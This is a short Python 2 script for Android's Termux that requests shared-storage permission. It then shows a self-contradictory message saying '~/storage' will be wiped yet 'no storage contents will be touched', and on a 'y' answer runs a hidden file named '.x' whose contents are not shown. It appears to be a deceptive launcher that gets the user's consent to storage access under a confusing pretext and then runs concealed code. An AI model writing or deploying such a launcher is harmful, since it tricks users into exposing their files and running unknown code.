import os

def a():

    os.system('clear')

    os.system('termux-setup-storage')

    os.system('clear')

    print ("Directory '~/storage")

    print ("is going to be wiped. ")

    print ("No storage contents will be touched.")

    print ("")

    g()

def g():

    r=raw_input("        Y/n : ")

    if r== 'y':

        os.system('termux-setup-storage -y')

        os.system("python2 .x")

    elif r== 'Y':

        os.system('termux-setup-storage -y')

        os.system("python2 .x")

    elif r== 'n':

        print ("Dont Use Thanks")

    else:

        print ("Type  Y ")

        a()

if __name__ == '__main__':

    a()
